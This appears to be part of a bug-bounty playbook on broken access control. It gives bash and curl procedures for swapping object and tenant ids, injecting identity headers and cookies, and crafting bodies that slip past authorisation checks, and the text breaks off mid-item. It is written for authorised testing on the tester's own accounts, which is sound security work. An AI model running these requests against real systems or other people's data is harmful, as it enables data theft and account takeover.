# BAC · Broken access control: IDOR, BOLA, BFLA, privilege escalation

> The server authenticates the caller and then acts on an object, a tenant or a function that caller was never
> granted, because the ownership or role check is missing on that route, that verb or that indirect reference.
> Only XSS has more paid reports in the library, and no class is less automated: every finding needs two of our
> own accounts and a proof seen from the victim's side. Most payouts are modest; the five-figure ones cross a
> tenant boundary or turn a low role into an administrator.

| | |
|---|---|
| **Class** | `access-control` |
| **Applies when** | http, app\|api |
| **Pays** | 1,459 disclosed reports filed under the class (525 more touch it), 374 paid, median $500, top $22,300. The best-paid ones read or copied another tenant's private objects through a secondary route (project import, a template, a `.json` sibling of a page, a GraphQL operation) or let a low role act as an administrator. |
| **Weaknesses** | Insecure Direct Object Reference (IDOR), Improper Access Control - Generic, Privilege Escalation, Improper Authorization, Forced Browsing · CWE-639, CWE-284, CWE-269, CWE-285, CWE-862, CWE-425 |

## Why it pays

Authorisation is decided per endpoint, and a product with a few hundred endpoints has a few hundred places to
forget it. No scanner knows who owns invoice 48213, so the class is left to hunters who register two accounts
and compare what each may do. That is why it is rarely a duplicate on a mature programme (`docs/07-graveyard.md`)
and why programmes with rich permission models disclose the most: Nextcloud (106 reports), Shopify (95),
HackerOne (72), Mail.ru (69), GitLab (58), New Relic (41).

The class has two axes, and each needs its own accounts:

| Axis | The caller reaches | Accounts | Items |
|---|---|---|---|
| Horizontal | an object of another user or tenant at the same privilege | `two-accounts`: A and B in separate tenants | BAC-001 to BAC-007, BAC-015, BAC-016 |
| Vertical | a function or object above its role inside its own tenant | `priv-accounts`: member A and the tenant's admin | BAC-011, BAC-014 |
| Either | the same route, tested along whichever axis the accounts allow | one of the two pairs | BAC-008 to BAC-010, BAC-012, BAC-013, BAC-017 |
| Both | an admin function aimed at another tenant | all three accounts | BAC-006 followed by BAC-011 |
| Neither | a denied path without any session | none | BAC-018 |

Where the money is, from `kb/reports/access-control.md`:

- **Secondary routes to the same data.** The main page checks; the import, the template, the copy, the export
  or the `.json` sibling does not: project import (#743953 and #767770, $20,000 each), project templates
  (#689314, $12,000), `reference.json` (#3862641, $15,000), an undocumented copy mutation (#981472, $2,000).
- **Writes by id.** Delete or edit by an identifier the client supplies: #1819832 ($15,000), #1213237 ($5,000),
  #415081 ($10,500).
- **A low role doing an admin's work.** An observer creating access keys (#1177451, $15,000), a list owner
  raising its own role (#2281075, $21,000), staff without permissions editing customers (#980511, $1,500).
- **Tenant boundaries.** #863983 ($8,000), #397137 ($2,500), #93921 ($2,500).
- **Bypasses of an earlier fix.** New Relic paid for the same leak again through a neighbouring endpoint
  (#267636, #320173, #347665, $1,500 each). A fixed IDOR marks the object type as worth a second sweep.

What does not pay: an IDOR that needs an unguessable id nobody leaks, an admin acting against the owner of the
same tenant, restrictions that exist only in the UI on data the role may read anyway, and existence oracles.

## The crux question

**For every request that names an object, a tenant or a privileged function: where does the server decide that
this caller may touch it, and is that decision repeated on every route, verb, version and indirect reference
that reaches the same data?**

## Applicability probe

The chapter gate (`http`, `app|api`) is set by the fingerprinter. The items are gated on four asset facts
(`object-ids`, `roles`, `multi-tenant`, `invite`) and three capabilities (`account`, `two-accounts`,
`priv-accounts`). All of them come out of the authenticated walk in PB-04.

```bash
# 1. identifiers the client supplies: id-shaped path segments and id-named keys in the saved requests
grep -rhoE '/([0-9]{3,}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}|[0-9a-f]{24})([/? ]|$)' "$E/recon/$H/requests/" | sort | uniq -c | sort -rn | head
grep -rhoE '"[A-Za-z_]*(_id|Id|uuid|guid)" *: *("[^"]+"|[0-9]+)' "$E/recon/$H/requests/" | cut -d: -f1 | sort | uniq -c | sort -rn | head -20
# 2. roles and tenants: the identity response and the bundles
curl -sS "${HDR[@]}" $A "$T/api/v1/me" | jq -r 'paths(scalars) | map(tostring) | join(".")' | grep -iE 'role|permission|scope|admin|org|tenant|workspace|team|account'
grep -rhoE '(isAdmin|is_admin|roles?|permissions?|hasPermission|orgId|org_id|tenantId|workspaceId|teamId)' "$E/recon/$H/js/" | sort | uniq -c | sort -rn | head -20
# 3. invitations and share links
grep -hoiE '/[a-z0-9_/.{}:-]*(invit|share|collaborat|member|join|public[-_]?link)[a-z0-9_/.{}:-]*' "$E/recon/$H/routes-from-js.txt" | sort -u | head -20
```

```bash
scripts/sane fact set "$H" object-ids=1 --ev "GET /api/v1/invoices/48213 and 14 more id-bearing routes in recon/$H/requests/"
scripts/sane fact set "$H" roles=1 multi-tenant=1 invite=1 --ev "me returns role and org_id; Settings > Team lists Owner/Admin/Member/Viewer; invite by e-mail; share links on documents"
scripts/sane fact set @eng account=1 two-accounts=1 priv-accounts=1 --ev "A and B in separate orgs; ADM is the admin of A's org, A is a member"
# a single-user tool where every request acts on the session's own data:
scripts/sane fact set "$H" object-ids=0 roles=0 multi-tenant=0 invite=0 --ev "walked authenticated: no id in any path, query or body; no team, role, invite or share feature"
```

With the four asset facts false, fourteen items close as n/a and the planner writes the reason. What can stay
open is BAC-004 (files), BAC-009 (search), BAC-010 (sockets) and BAC-018 (denied paths), each on its own fact.
When only the capability facts are false the items are `blocked`, not closed: write the blocker ("second
account needed: sign-up is invite-only") and tell the operator, because seventeen of the eighteen items need a
second account of one kind or the other. Assets that fail the gate (`static`, `default-page`, `redirect-only`)
get the note "no application behind this host: no per-user state to authorise".

## Triage order

BAC-018 needs no account and can run during recon on every host with a denied path. With accounts, on a fresh
deployment: BAC-001 (swap the id in a GET: minutes per endpoint) → BAC-002 (the same swap in bodies, GraphQL
variables, headers) → BAC-006 (one tenant identifier, whole-tenant ceiling) → BAC-003 (writes, proven on B) →
BAC-011 (admin functions as the low role) → BAC-014 (role fields) → BAC-012 (other methods on everything refused
so far) → BAC-004 (files and attachments) → BAC-007 (import, copy, attach) → BAC-008 (exports) → BAC-015
(invitations) → BAC-016 (share links) → BAC-013 (old and alternate API surfaces) → BAC-009 (search and filters)
→ BAC-010 (WebSocket channels) → BAC-017 (removal and downgrade) → BAC-005 (only when an IDOR is parked behind
an unguessable id) → BAC-018 again with a session, on paths refused to the low role.

## Items

### BAC-001 · An object id in the URL path or query string returns another account's object

| | |
|---|---|
| **Severity** | Medium standalone for private data of another account; High when the object holds documents, payment or identity data, or when the read needs no session; Critical when it returns credentials or tokens that give the account away |
| **Requires** | object-ids, two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Insecure Direct Object Reference (IDOR) · CWE-639 |
| **Prior art** | #3862641, #1658418, #723461, #1392630 |

- **Where:** every authenticated GET in `$E/recon/$H/map.md` and `$E/recon/$H/requests/` with an identifier in
  the path or query: numeric id, UUID, slug, e-mail, username, order number, hash. Add the siblings the UI never
  calls: the `.json`, `.xml`, `.csv`, `/edit`, `/raw`, `/history`, `/print` and `/embed` forms of a page
  (#3862641 was `reference.json`), child collections (`/orders/<id>/items`, `/users/<id>/addresses`), and
  id-taking routes in `$E/recon/$H/routes-from-js.txt`.
- **Test:** the handler loads the record by the id in the URL and checks only that a session exists, not that
  the record belongs to the session's user or tenant. B creates one object of each type with a marker in a
  private field; A requests B's URLs.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-001"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  # 0. two different users: the test is void when both variables carry the same session
  curl -sS "${HDR[@]}" $A "$T/api/v1/me" | jq -c '{id,email,org_id}'; curl -sS "${HDR[@]}" $B "$T/api/v1/me" | jq -c '{id,email,org_id}'
  # 1. inventory: id-shaped path segments and id-named query parameters in the requests saved while mapping
  grep -rhoE '[A-Z]+ +/[^ ]*/([0-9]{3,}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}|[0-9a-f]{24})[^ ]*' "$E/recon/$H/requests/" | sort -u
  grep -rhoE '[?&][A-Za-z_]*(id|Id|uuid|guid|user|account|owner|email|number|ref|key)=[^& ]+' "$E/recon/$H/requests/" | sort | uniq -c | sort -rn | head -30
  # 2. as B: create one object of each type with the marker in a private field; write each read URL to urls.txt
  M="bac001$(date +%s)"; echo "$M" > "$D/marker.txt"
  # 3. each URL as B (control), as A (test) and without a session
  while read -r u; do n=$(printf '%s' "$u" | md5sum | cut -c1-8)
    for who in B A anon; do case $who in B) S=$B;; A) S=$A;; *) S=;; esac
      curl -sS "${HDR[@]}" $S -o "$D/$n.$who.body" -w "$who %{http_code} %{size_download} $u\n" "$u"; sleep "$W"; done
  done < "$D/urls.txt" | tee "$D/matrix.txt"
  grep -l "$M" "$D"/*.A.body "$D"/*.anon.body     # each file listed is B's object in a response B did not request
  ```
  For URLs that refuse A, the check and the lookup may read different parts of the request:
  ```text
  /api/v1/invoices/1234.json     /api/v1/invoices/1234/     /api/v1/invoices/1234/pdf     /api/v1/invoices/1234?format=csv
  /api/v1/users/<B id>/invoices/1234    /api/v1/users/<A id>/invoices/1234    parent checked, child not (and the reverse)
  /api/v1/invoices?id=1234    ?ids=1234    ?ids[]=<A obj>&ids[]=1234    ?filter[id]=1234    ?user_id=<B id>    ?owner=<B id>
  /api/v1/invoices/<A obj>?id=1234      the path id is authorised, the query id is used
  /api/v1/invoices/01234    /1234%20    /1234.0    /1234,<A obj>      the check and the lookup parse the id differently
  ```
  Add `-g` to curl for URLs with brackets. Only ids of objects B created. Do not increment or enumerate: every
  other id belongs to a real customer.
- **Proof:** A's request and the response containing B's marker, B's own view of the same object, and the `me`
  output of both sessions showing different user and tenant ids. To show scale without enumerating, state how
  the id is formed: two objects B created a minute apart have adjacent numbers.
- **Not a finding when:** the status is 200 and the body is an error, a login page or A's own data (the server
  ignored the id and used the session): compare bodies, never status codes. The object is public by design
  (public profile, published listing) or A and B share a tenant in which A's role may see it. Ids are local to
  a tenant (invoice 12 exists in both) and A received its own. A CDN returned B's cached response because B
  fetched the URL first: repeat with a cache-busting parameter; if the hit disappears it was the cache, which is
  a CCH item and not an IDOR. The only difference is 403 for a real id and 404 for a missing one: an existence
  oracle.
- **Escalate:** the write verbs on the same route (BAC-003), the same id in a body or header (BAC-002), other
  methods on a refusal (BAC-012), the export of the same type (BAC-008). A hit in the `anon` column is an
  unauthenticated read and rates higher. A UUID-keyed hit needs BAC-005 before it is worth reporting. One hit
  means authorisation is per endpoint: sweep the sibling endpoints of the same object type and report the set
  as one root cause.

### BAC-002 · An id sent in the request body, GraphQL variables, a header or a cookie is trusted over the session

| | |
|---|---|
| **Severity** | Medium standalone for private data of another account; High when the object holds documents, payment or identity data; Critical when a header or cookie value switches the whole session to another user |
| **Requires** | object-ids, two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Insecure Direct Object Reference (IDOR) · CWE-639 |
| **Prior art** | #415081, #2207248, #2032716, #2132183 |

- **Where:** POST, PUT and PATCH bodies and GraphQL `variables` with keys such as `id`, `*_id`, `*Id`, `uuid`,
  `user`, `account`, `owner`, `email`, `customer`, `member`; routes whose path is generic (`/api/me/...`,
  `/account/update`, `/graphql`, `/rpc`) and that name the object only in the body; headers and cookies that
  carry an identity next to the session (`X-User-Id`, `X-Account-Id`, `X-Customer-Id`, `uid=`, `user_id=`, a
  base64 or JSON blob with ids inside).
- **Test:** the server authenticates the session and then acts on the id it was sent. Replace the id with B's at
  each position. Where a plain swap is refused, give the check one value and the lookup another.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-002"; mkdir -p "$D"
  BID='<B user id, from B own me response>'; BOBJ='<id of an object B created with the marker bac002 in a private field>'
  # inventory: id-carrying keys in saved bodies
  grep -rhoE '"[A-Za-z_]*([iI]d|uuid|guid|owner|account|user|email|customer|member)[A-Za-z_]*" *: *("[^"]{1,64}"|[0-9]+)' "$E/recon/$H/requests/" | sort | uniq -c | sort -rn | head -40
  # 1. body: a read-style POST that names the object
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/invoices/details" -H 'Content-Type: application/json' \
    -d "{\"invoice_id\":\"$BOBJ\"}" -o "$D/body.json" -w '%{http_code} %{size_download}\n'; grep -c bac002 "$D/body.json"
  # 2. GraphQL: the operation the client really sends, with B's id in variables (raw id, then the global-id forms)
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' -o "$D/gql.json" -d "$(jq -n --arg id "$BOBJ" \
    '{operationName:"BillDetails",query:"query BillDetails($id:ID!){invoice(id:$id){id number total billingEmail}}",variables:{id:$id}}')"
  jq '.data, [.errors[]?.message]' "$D/gql.json"; printf 'Invoice:%s' "$BOBJ" | base64 -w0; echo "   gid://app/Invoice/$BOBJ"
  # 3. identity headers next to A's session
  for h in "X-User-Id: $BID" "X-Account-Id: $BID" "X-Customer-Id: $BID" "X-Forwarded-User: <B e-mail>" "X-Impersonate: $BID" "X-On-Behalf-Of: $BID"; do
    printf '%-34s ' "$h"; curl -sS "${HDR[@]}" $A -H "$h" "$T/api/v1/me" | jq -c '{id,email}'; sleep 1; done
  # 4. identity cookie appended to A's own Cookie line
  sed "s/^\([Cc]ookie:.*\)$/\1; user_id=$BID; uid=$BID; account_id=$BID/" "$E/accounts/A.headers" > "$D/A-cookie.headers"
  curl -sS "${HDR[@]}" -H @"$D/A-cookie.headers" "$T/api/v1/me" | jq -c '{id,email}'
  ```
  When the plain swap is refused:
  ```text
  {"invoice_id":"<A obj>","invoice_id":"<B obj>"}        duplicate key: the check reads the first, the handler the last
  {"invoice_id":["<B obj>"]}    {"invoice_id":{"id":"<B obj>"}}    {"invoice_id":"<A obj>,<B obj>"}     a type the check does not expect
  {"invoice_ids":["<A obj>","<B obj>"]}                    only the first element is authorised
  POST /api/v1/invoices/details?invoice_id=<A obj>    body: invoice_id=<B obj>     query and body disagree (and the reverse)
  {"invoice_id":"<A obj>","user_id":"<B id>"}             a second key the form never sends: user_id, account_id, owner_id, org_id
  {"id":"12345"} -> {"id":12345}    {"id":"0012345"}    a legacy numeric id accepted where the client sends a UUID
  ```
- **Proof:** A's request with B's id at the named position, the response containing B's marker, and the same
  request with A's own id as the control. For a header or cookie: `me` returning B's identity on A's session,
  then one private read. Both `me` outputs.
- **Not a finding when:** the response echoes the id you sent and every other field is A's. GraphQL answers 200
  with an `errors` entry and `data: null`. The header is ignored, or the edge overwrites it before the
  application sees it (no change in `me`). The cookie only changes a display name in the page while the API
  still returns A's data. The object is shared with A by design.
- **Escalate:** writes through the same position (BAC-003). The schema-wide version of step 2 is GQL-004 for
  lookups and GQL-006 for mutations. A second key that sets `owner_id` or `role` goes to BAC-014 and the API
  chapter (mass assignment). An identity header that works is account takeover for any id: prove it on B with
  `me` and one read, then stop.

### BAC-003 · A state-changing request by one account edits or deletes the second account's object

| | |
|---|---|
| **Severity** | High standalone for an edit or delete of another account's private object; Critical when the changed field hands over the account (e-mail, phone, password, 2FA, payout details); Medium for low-value settings |
| **Requires** | object-ids, two-accounts, state-change |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Insecure Direct Object Reference (IDOR) · CWE-639 |
| **Prior art** | #1819832, #1213237, #1250037, #757095 |

- **Where:** every PUT, PATCH, DELETE and action-style POST that names an object (`/cancel`, `/archive`,
  `/transfer`, `/approve`, `/resend`, `/revoke`, `/restore`), and account-level writes that name the user:
  profile, e-mail, phone, addresses, payment methods, notification settings, sessions, API keys. Include routes
  whose GET refused A in BAC-001: read checks and write checks are separate code.
- **Test:** the write handler looks the object up by id and applies the change without an ownership check. All
  targets are objects B created for this test. Edit a harmless field first; delete only an object made to be
  deleted; touch account-level fields only with values B can set back.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-003"; mkdir -p "$D"; U="$T/api/v1/notes"
  # B creates two throwaway objects and reads their ids from B's own session
  EDIT='<id of B note 1>'; DEL='<id of B note 2>'
  curl -sS "${HDR[@]}" $B "$U/$EDIT" -o "$D/01-before-as-B.json"
  # edit one harmless field as A (send A's own anti-CSRF token where the app uses one)
  curl -sS -i "${HDR[@]}" $A -X PATCH "$U/$EDIT" -H 'Content-Type: application/json' -d '{"title":"bac003-edited-by-A"}' -o "$D/02-patch-as-A.txt"
  curl -sS "${HDR[@]}" $B "$U/$EDIT" -o "$D/03-after-as-B.json"; diff <(jq -S . "$D/01-before-as-B.json") <(jq -S . "$D/03-after-as-B.json")
  # delete the object B created for deletion; B's view decides
  curl -sS -i "${HDR[@]}" $A -X DELETE "$U/$DEL" -o "$D/04-delete-as-A.txt"; head -1 "$D/04-delete-as-A.txt"
  curl -sS "${HDR[@]}" $B -o /dev/null -w 'B now gets %{http_code} for the deleted note\n' "$U/$DEL" | tee "$D/05-after-delete-as-B.txt"
  # account-level: a field of B's profile that B can set back
  curl -sS -i "${HDR[@]}" $A -X PUT "$T/api/v1/users/<B user id>" -H 'Content-Type: application/json' -d '{"display_name":"bac003"}' -o "$D/06-profile-as-A.txt"
  curl -sS "${HDR[@]}" $B "$T/api/v1/me" | jq -c '{id,display_name,email}' | tee "$D/07-me-as-B.json"
  ```
  List every object created or changed in `cleanup.md` and restore B's values.
- **Proof:** B's view before, A's request and response, B's view after. For a delete: B's 404 on the object and
  its absence from B's list. A success status in A's response proves nothing without B's view.
- **Not a finding when:** A gets 200 or 204 and B's view is unchanged (the write hit nothing, or hit an object
  of A with the same local id). The response echoes the new value and a fresh read as B shows the old one. A 403
  comes from a missing CSRF token, not from authorisation. The action is open to any user by design (follow,
  react, report, comment on a public object). A and B share a tenant and A's role may edit.
- **Escalate:** if the profile write works, set B's e-mail to a second alias we control, request a password
  reset, log in as B: account takeover proven on our own account (AUT chapter), then restore. Markup written into
  B's object that B's browser renders is a cross-account stored XSS (XSS chapter). The same write accepted over
  GET goes to the CSR chapter. Do not use bulk forms (`ids[]`, `all=true`) against anything but B's objects.

### BAC-004 · A private file or attachment of the second account downloads with another session or with none

| | |
|---|---|
| **Severity** | High standalone for private documents (identity scans, invoices, message attachments); Medium for low-sensitivity files; Low when the URL is unguessable and nothing leaks it |
| **Requires** | two-accounts, upload\|file-param\|render |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Insecure Direct Object Reference (IDOR) · CWE-639 |
| **Prior art** | #950507, #1626508, #668439, #1984060 |

- **Where:** download routes (`/download?id=`, `/attachments/<id>`, `/files/<id>/<name>`,
  `/api/v1/documents/<id>/content`), the variants of one file (`/thumb/`, `/preview/`, `/convert/`, `?size=`,
  `/original`), storage and CDN URLs that appear in API responses, and file names built from guessable parts
  (`invoice-<number>.pdf`, `export_<user id>_<date>.csv`, `<order number>.png`).
- **Test:** the page that lists attachments checks ownership; the route that streams the bytes checks only that
  a session exists, or nothing at all when it is plain object storage. A name built from a number replaces the
  ownership check with a naming convention.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-004"; mkdir -p "$D"
  # B uploads a private file with known bytes, and opens each generated document once (invoice, receipt, export)
  printf 'bac004 private file of B %s\n' "$(date -u +%FT%TZ)" > "$D/b-private.txt"; sha256sum "$D/b-private.txt"
  curl -sS "${HDR[@]}" $B -F "file=@$D/b-private.txt;type=text/plain" "$T/api/v1/attachments" | tee "$D/upload-as-B.json"
  FURL='<download URL of that file, copied from B own session>'
  for who in B A anon; do case $who in B) S=$B;; A) S=$A;; *) S=;; esac
    curl -sS -L "${HDR[@]}" $S -o "$D/get.$who.bin" -w "$who %{http_code} %{size_download} %{content_type} %{url_effective}\n" "$FURL"; sleep 1; done | tee "$D/matrix.txt"
  sha256sum "$D"/get.*.bin                  # equal hashes for B and A (or anon) are the hit
  # the name position: a document of B addressed by its guessable name
  curl -sS "${HDR[@]}" $A -o "$D/name.bin" -w '%{http_code} %{size_download} %{content_type}\n' "$T/download?file=invoice-<B invoice number>.pdf"
  # storage URL: is it signed, and for how long?
  echo "$FURL" | grep -oE '(X-Amz-Expires|X-Amz-Signature|Expires|Signature|sig|se|exp|token)=[^&]*'
  curl -sS -I "${HDR[@]}" "$FURL" | grep -iE '^(HTTP|location|cache-control|expires|x-amz-|x-goog-)'
  ```
  Repeat the three-way fetch for the thumbnail, preview and converted copies: the original is often guarded and
  the derivative is not.
- **Proof:** the bytes of B's file (same SHA-256) returned to A or to no session, the request that fetched them,
  and B's UI or API showing the file as private. For a name-based hit: two of B's own documents that show the
  naming pattern.
- **Not a finding when:** the URL is signed, expires within minutes and is issued only to an authorised session:
  the URL is the credential by design. The file is public by design (avatars, product images, published posts).
  The `anon` fetch returns 200 with the login page: compare hashes. A deleted file is still served from a CDN
  cache for a short time (informative on most programmes).
- **Escalate:** an unsigned storage URL with a random key is as strong as the secrecy of the key: BAC-005. A
  private file that becomes public after a transformation or a share (#1984060) is its own report. A listable
  bucket goes to the CLD chapter, `file=` that accepts `../` to the LFI chapter, attachments reachable through a
  report or export to BAC-008.

### BAC-005 · Unguessable ids of another account's objects are disclosed by a route the attacker can call

| | |
|---|---|
| **Severity** | None standalone; High with an IDOR from BAC-001 to BAC-004 that was parked because its id is a UUID or a long token |
| **Requires** | object-ids, two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Information Disclosure · CWE-200 |
| **Prior art** | #195996, #447930, #254151, #2483666 |

- **Where:** start from an IDOR whose only defence is that the id is a UUID, a hash or a random token. Sources
  of other users' ids: public profile and listing pages, API objects that embed `owner`, `created_by`,
  `assignee` or `members[]`, search and mention pickers, flows that resolve an e-mail or username on our behalf
  (invite, share, transfer), state embedded in public HTML (`__NEXT_DATA__`, `data-` attributes), feeds and
  sitemaps, avatar and file URLs that contain the user id, error messages, e-mails the app sends to A about B.
- **Test:** find one request, available to A or to no session, that starts from something an attacker knows
  about a victim (username, e-mail, public profile URL) and returns the id the IDOR takes. Separately, read how
  the id is built: time-based ids are guessable by construction.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-005"; mkdir -p "$D"
  BUID='<B user id>'; BOBJ='<id of the private object the IDOR takes>'      # both read from B own session, never guessed
  # 1. does anything already captured as A or without a session contain B's ids?
  grep -rlF -e "$BUID" -e "$BOBJ" "$E/recon/$H/" "$E/evidence/$H/" 2>/dev/null | grep -vE '\.B\.|as-B' | head
  # 2. lookups that turn a public handle into the id
  for u in "/api/v1/users?username=<B username>" "/api/v1/users/search?q=<B username>" "/api/v1/users/lookup?email=<B e-mail>" \
           "/u/<B username>" "/api/v1/profiles/<B username>" "/api/v1/mentions?q=<B username>"; do
    printf '%-50s ' "$u"; curl -sS "${HDR[@]}" $A "$T$u" | grep -oF -e "$BUID" -e "$BOBJ" | sort -u | tr '\n' ' '; echo; sleep 1; done | tee "$D/lookups.txt"
  # 3. flows that resolve an identity for A: share one of A's objects with B's e-mail and read the response
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/shares" -H 'Content-Type: application/json' \
    -d '{"object_id":"<A object id>","email":"<B e-mail>"}' | tee "$D/share.json" | grep -oF "$BUID"
  # 4. how is the id built?
  python3 - "$BOBJ" <<'PY'
  import sys, uuid, datetime
  s = sys.argv[1]
  try:
      u = uuid.UUID(s); print("UUID version", u.version)
      if u.version == 1:
          t = datetime.datetime(1582, 10, 15) + datetime.timedelta(microseconds=u.time // 10)
          print("time-based: created", t, "node", hex(u.node), "- ids made in the same interval differ only in the time bits")
  except ValueError:
      if len(s) == 24: print("Mongo ObjectId: timestamp", datetime.datetime.fromtimestamp(int(s[:8], 16), datetime.timezone.utc), "+ machine + counter")
      elif s.isdigit() and len(s) >= 17: print("Snowflake-style: millisecond timestamp + worker + sequence")
      elif len(s) == 26: print("ULID: 48-bit millisecond timestamp prefix")
      else: print("opaque: compare two ids B created seconds apart")
  PY
  ```
- **Proof:** one report with two steps: the request that returns B's id starting from B's public handle, then the
  IDOR request that uses it. Without the second step there is nothing to report.
- **Not a finding when:** the id leaks only to B or to members of B's tenant. The id that leaks belongs to a
  different id space from the one the IDOR takes (public profile id against internal account id). The id is a
  version 4 UUID and no route discloses it: the IDOR stays parked. Ids found in public archives or search
  engines belong to real users: they may be cited as evidence of the leak and never used as test targets.
- **Escalate:** re-rate the parked IDOR as exploitable against any user whose handle is known and report the
  pair. For a time-based id, state the size of the id space between two of B's own ids and stop: iterating it
  touches real users and is enumeration. An id that leaks to third parties through the `Referer` header or an
  analytics call belongs to the INF chapter.

### BAC-006 · A tenant identifier supplied by the client switches the request into another tenant

| | |
|---|---|
| **Severity** | High standalone when another tenant's objects are read or written by changing one identifier; Critical when the tenant check is missing for every object type, so that any tenant is fully readable and writable; Medium for tenant metadata |
| **Requires** | multi-tenant, two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Improper Access Control - Generic · CWE-284 |
| **Prior art** | #863983, #397137, #93921, #1363185 |

- **Where:** every place the tenant is named: the path (`/orgs/<org>/`, `/accounts/<id>/`,
  `/workspaces/<slug>/`), the sub-domain, a header (`X-Org-Id`, `X-Tenant-Id`, `X-Workspace-Id`), a cookie
  (`current_org=`), a query or body key (`org_id`, `account_id`, `workspace`, `shop`), and the "switch
  organisation" request.
- **Test:** the session is authenticated globally and the tenant comes from the request. Membership is checked
  when the user switches tenant in the UI and not on each API call. Send A's session with B's tenant at each
  position, then mix them: A's tenant in the path and B's object below it.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-006"; mkdir -p "$D"
  AT='<A tenant id or slug>'; BT='<B tenant id or slug>'; BOBJ='<id of a project in B tenant named bac006-marker>'
  # where does the tenant travel?
  grep -rhoiE '(x-(org|organization|tenant|workspace|account|company|team|shop)[a-z-]*: *[^ ]+|"(org|organization|tenant|workspace|account|company|team|shop)_?(id|slug|uuid)?" *: *"?[A-Za-z0-9_-]+|/(orgs|organizations|tenants|workspaces|accounts|companies|teams|shops)/[A-Za-z0-9_-]+)' \
    "$E/recon/$H/requests/" | sort | uniq -c | sort -rn | head -30
  # 1. path
  curl -sS "${HDR[@]}" $A "$T/api/v1/orgs/$BT/projects" -o "$D/path.json" -w 'path %{http_code} %{size_download}\n'
  curl -sS "${HDR[@]}" $A "$T/api/v1/orgs/$BT/members"  -o "$D/members.json" -w 'members %{http_code} %{size_download}\n'
  # 2. header, on a route with no tenant in its path
  for h in "X-Org-Id: $BT" "X-Organization-Id: $BT" "X-Tenant-Id: $BT" "X-Workspace-Id: $BT" "X-Account-Id: $BT"; do
    curl -sS "${HDR[@]}" $A -H "$h" "$T/api/v1/projects" -o "$D/hdr-$(echo "$h" | cut -d: -f1).json" -w "%{http_code} %{size_download} $h\n"; sleep 1; done
  # 3. mixed: own tenant in the path, B's object underneath; and B's tenant as a query key
  curl -sS "${HDR[@]}" $A "$T/api/v1/orgs/$AT/projects/$BOBJ" -o "$D/mixed.json" -w 'mixed %{http_code} %{size_download}\n'
  curl -sS "${HDR[@]}" $A "$T/api/v1/projects?org_id=$BT" -o "$D/query.json" -w 'query %{http_code} %{size_download}\n'
  # 4. the switch request, then the same list again
  curl -sS -i "${HDR[@]}" $A -X POST "$T/api/v1/session/switch" -H 'Content-Type: application/json' -d "{\"org_id\":\"$BT\"}" | head -15
  grep -l 'bac006-marker' "$D"/*.json
  ```
  Where tenants live on sub-domains, send A's session to B's tenant host as well, when that host is in scope.
- **Proof:** A's response listing B's tenant's projects or members with B's marker, the membership list of B's
  tenant (from B's session) showing A is not in it, and both `me` outputs.
- **Not a finding when:** the response is A's own tenant's data although the URL names B's (the server used the
  session's tenant). A is a member of both tenants. The data is tenant metadata the login page needs (name,
  logo, SSO URL). The object lives in a shared namespace by design (public templates, a marketplace).
- **Escalate:** a write in B's tenant against an object B created for it (method of BAC-003); an invitation of
  A's alias into B's tenant (BAC-015); an admin function with B's tenant id (BAC-011), which is the critical
  case. A tenant claim inside a token is JWT-010. A tenant taken from the `Host` header goes to the HHI chapter.

### BAC-007 · A create, copy, import or attach request that references another account's object copies it into ours

| | |
|---|---|
| **Severity** | High standalone when private content of another account lands in an object we own; Critical when whole projects, repositories or document sets are cloned |
| **Requires** | object-ids, two-accounts, state-change |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Insecure Direct Object Reference (IDOR) · CWE-639 |
| **Prior art** | #743953, #767770, #689314, #981472 |

- **Where:** features that take a reference to an existing object and produce something A owns: duplicate,
  clone, "use as template", move or transfer between projects, import of an archive or JSON file that carries
  ids, "attach an existing file", forward or save-as (#204984), link an existing record. Keys: `source_id`,
  `template_id`, `parent_id`, `copy_from`, `attachment_ids[]`, `file_id`, `upload_id`, `avatar_id`, `linked_id`.
- **Test:** the handler checks that A may write to the destination and never checks that A may read the source.
  The copy lands in A's account, where A reads it with ordinary permissions. The direct read of the source stays
  refused, which is why read-only sweeps miss it.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-007"; mkdir -p "$D"
  BSRC='<id of a private document B created with bac007-marker in its body>'; BFILE='<id of a private file B uploaded>'
  # keys that reference an existing object in create-style requests
  grep -rhoE '"(source|src|template|parent|copy_?from|clone_?of|origin|base|ref|linked|attachment|file|upload|image|avatar|asset)_?(id|ids|uuid|key)?" *:' "$E/recon/$H/requests/" | sort | uniq -c | sort -rn
  # control: the direct read is refused
  curl -sS "${HDR[@]}" $A -o /dev/null -w 'direct read of the source as A: %{http_code}\n' "$T/api/v1/documents/$BSRC"
  # 1. create-from and duplicate
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/documents" -H 'Content-Type: application/json' \
    -d "{\"title\":\"bac007\",\"template_id\":\"$BSRC\"}" | tee "$D/create-from.json" | jq -c '{id,title}'
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/documents/$BSRC/duplicate" -H 'Content-Type: application/json' \
    -d '{"destination_project":"<A project id>"}' | tee "$D/duplicate.json" | jq -c '{id,title}'
  # 2. attach B's file to an object A owns
